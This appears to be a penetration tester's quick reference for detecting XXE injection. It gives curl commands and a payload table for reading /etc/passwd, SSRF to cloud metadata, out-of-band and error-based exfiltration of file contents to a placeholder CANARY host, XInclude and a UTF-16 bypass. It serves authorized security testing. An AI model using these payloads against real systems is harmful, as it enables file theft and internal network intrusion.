# XXE Injection — Quick Reference

> Quick reference for XXE detection. Full methodology in `web/vuln-classes/references/xxe.md`.
> All HTTP traffic via Caido proxy (`-x "http://localhost:8080"`).

---

## Quick Detection (via Caido)

```bash
# 1. Baseline
curl -x "http://localhost:8080" -sS -D - -o /dev/null "https://target.com/api/endpoint" > baseline.txt

# 2. Internal entity test (safe)
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE root [<!ENTITY test "MARKER">]><root>&test;</root>' \
  "https://target.com/api/endpoint"

# 3. External entity (OOB)
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE root [<!ENTITY xxe SYSTEM "https://CANARY/xxe">]><root>&xxe;</root>' \
  "https://target.com/api/endpoint"

# 4. Blind XXE (parameter entity)
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE root [<!ENTITY % remote SYSTEM "https://CANARY/xxe"> %remote;]><root/>' \
  "https://target.com/api/endpoint"

# 5. Error-based (file read via error)
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE root [<!ENTITY % remote SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY % error SYSTEM '"'"'https://CANARY/%remote;'"'"'">%eval;%error;]><root/>' \
  "https://target.com/api/endpoint"

# 6. XInclude
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Content-Type: application/xml" \
  -d '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="https://CANARY/xinclude" parse="text"/></root>' \
  "https://target.com/api/endpoint"
```

---

## Key Payloads

| Type | Payload |
|------|---------|
| Basic External Entity | `<!ENTITY xxe SYSTEM "https://CANARY/xxe">` |
| File Disclosure | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| SSRF | `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` |
| Blind OOB | `<!ENTITY % remote SYSTEM "https://CANARY/xxe"> %remote;` |
| Error-Based | `<!ENTITY % remote SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY % error SYSTEM 'https://CANARY/%remote;'>%eval;%error;` |
| Parameter Entity | `<!ENTITY % remote SYSTEM "https://CANARY/xxe"> %remote;` |
| XInclude | `<xi:include href="https://CANARY/xinclude" parse="text"/>` |
| UTF-16 Bypass | Convert payload to UTF-16, send with `charset=UTF-16` |

---

## Verification Sequence

```
1. Baseline request
2. Internal entity test (marker reflected?)
3. External entity → OOB callback
4. Blind XXE (parameter entity) → OOB callback
5. Error-based → file content in error
6. XInclude → OOB callback
7. Clean request → verify no persistence
8. Cross-session validation
```

---

## Chain Escalation

| Finding | Chain | Severity |
|---------|-------|----------|
| XXE → File Disclosure | Direct | High |
| XXE → SSRF → Internal Service | XXE → SSRF | Critical |
| XXE → Cloud Metadata | XXE → SSRF | Critical |
| XXE → RCE (expect://, PHP) | XXE → RCE | Critical |
| XXE → File Upload → Stored XSS | XXE → Stored XSS | Critical |
| XXE → Cache Poisoning | XXE → Cache Poisoning | High |
| XXE → SSRF → Internal Service | XXE → SSRF | Critical |
| XXE → WCD → Data Exposure | XXE → WCD | High |
| XXE → DoS (Billion Laughs) | XXE → DoS | Medium |

---

## False Positive Elimination

| Observation | Why Not Vulnerable | Required Validation |
|-------------|-------------------|---------------------|
| DOCTYPE accepted | DTD syntax only | Test external entity |
| Internal entity expanded | Normal XML behavior | Test external entity |
| No callback | Network/firewall | Test internal callback |
| WAF block | WAF blocking | Test bypass / direct to origin |
| Parser error | Malformed XML | Valid XML with entity |

---

## Caido Integration

```bash
# All via Caido proxy
curl -x "http://localhost:8080" ...

# Burp Collaborator via Caido
# Configure Burp upstream proxy to http://localhost:8080
```

---

## Key Header Patterns

```
VULNERABLE:
- External entity callback received
- File content in response
- Error with file content
- Cache behavior change

NOT VULNERABLE (alone):
- DOCTYPE accepted
- Internal entity expanded
- DTD syntax accepted
```